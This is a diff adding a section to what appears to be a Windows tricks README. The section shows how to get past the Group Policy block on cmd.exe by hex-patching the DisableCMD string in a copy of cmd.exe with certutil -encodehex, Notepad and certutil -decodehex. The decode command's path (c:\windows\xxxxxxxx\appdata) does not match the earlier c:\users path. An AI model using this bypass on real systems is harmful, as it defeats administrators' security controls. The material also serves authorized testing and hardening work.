@@ -588,8 +588,42 @@ $objSNMP.Close()
 
 ## >> Circumventing cmd.exe policy restrictions
 
-Windows group policy can be configured to disable execution of the command prompt by setting a configuration option under Computer Policy >> User Configuration >> Administrative Templates >> System.  This results in the following message when attempting to launch the command prompt.
+Windows group policy can be configured to disable execution of the command prompt by setting an option under Computer Policy >> User Configuration >> Administrative Templates >> System.  This results in the following message being displayed when attempting to launch the command prompt.
 
 ![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd02.png)
 
+The cmd.exe program tests the following registry value to determine if this policy is set:<br />
+`HKCU\Software\Policies\Microsoft\Windows\System\DisableCMD`
 
+The unicode string for the registry value exists in the cmd.exe binary.  You can make a copy of cmd.exe and edit this string to defeat policy checking.  Here is an example of generating the hex characters to search for.
+
+`echo DisableCMD | iconv -t utf-16le | hexdump -Cv`<br />
+![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd00.png)
+
+Using certutil.exe you can make a copy of cmd.exe represented as a text file containing hex characters.<br />
+`c:\windows\system32\certutil.exe -encodehex c:\windows\system32\cmd.exe c:\users\xxxxxxxx\appdata\local\temp\cmd.txt`
+
+![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd03.png)
+
+Now edit the text file using notepad.<br />
+`c:\windows\system32\notepad.exe c:\users\xxxxxxxx\appdata\local\temp\cmd.txt`
+
+![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd04.png)
+
+Find the hex characters that make up the unicode string generated earlier.<br />
+![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd05.png)<br />
+![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd06.png)
+
+Edit the hex values from `44 00 69 00` to `44 00 00 00` and save the text file.<br />
+![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd07.png)
+
+Convert the text file back into an exe.<br />
+`c:\windows\system32\certutil.exe -decodehex c:\windows\xxxxxxxx\appdata\local\temp\cmd.txt c:\windows\xxxxxxxx\appdata\local\temp\cmd.exe`
+
+![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd08.png)
+
+Double-click on the modified copy of cmd.exe.<br />
+![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd09.png)
+
+You now have a command shell.<br />
+![alt text](https://github.com/billchaison/Windows-Trix/blob/master/cmd10.png)
